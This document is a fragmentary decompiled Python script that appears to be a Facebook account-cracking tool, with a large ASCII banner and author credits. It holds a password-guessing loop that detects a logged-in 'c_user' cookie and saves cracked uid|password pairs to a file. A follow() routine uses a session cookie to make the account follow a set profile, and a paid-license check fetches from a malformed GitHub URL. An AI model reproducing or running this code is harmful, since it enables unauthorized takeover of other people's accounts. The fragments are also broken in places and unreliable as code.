# Decompile by CYBER ARAFAT
# Github : PRINCE-ARAFAT 
#Facebook : PrinceArafat-770
#-------------------------------------------------------------------------------#
#Don't Forget To Follow My Github👇
# github.com/PRINCE-ARAFAT
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=61551411116495',) 
...
logo =("""
 ...
 __       __  _______         __       __   ______   ________  ______  __      __   ______  
|  \     /  \|       \       |  \     /  \ /      \ |        \|      \|  \    /  \ /      \ 
| $$\   /  $$| $$$$$$$\      | $$\   /  $$|  $$$$$$\| $$$$$$$$ \$$$$$$ \$$\  /  $$|  $$$$$$\
| $$$\ /  $$$| $$__| $$      | $$$\ /  $$$| $$__| $$| $$__      | $$    \$$\/  $$ | $$__| $$
| $$$$\  $$$$| $$    $$      | $$$$\  $$$$| $$    $$| $$  \     | $$     \$$  $$  | $$    $$
...
| $$  \$ | $$| $$  | $$      | $$  \$ | $$| $$  | $$| $$      |   $$ \    | $$    | $$  | $$
 ...
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m 𝐌𝐑 𝐑𝐀𝐅𝐈       \033[1;93m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m 𝐑𝐀𝐅𝐈 𝐂𝐇𝐎𝐖𝐃𝐇𝐔𝐑𝐘       \033[1;93m║
 \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35m𝐌𝐑 𝐑𝐀𝐅𝐈         \033[1;93m ║
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/𝐌𝐄-RAF-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} [{xr}Fuck-MR RAFI{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def superuser():
    ...
    id = "71".join(uuid)
    print(logo)
    DARK=requests.get("hthttps://github.com/cyberrafi-31/-/blob/main/Paid.txt").text
    if id in DARK:
        os.system('clear')
        print(logo)
        xxr()
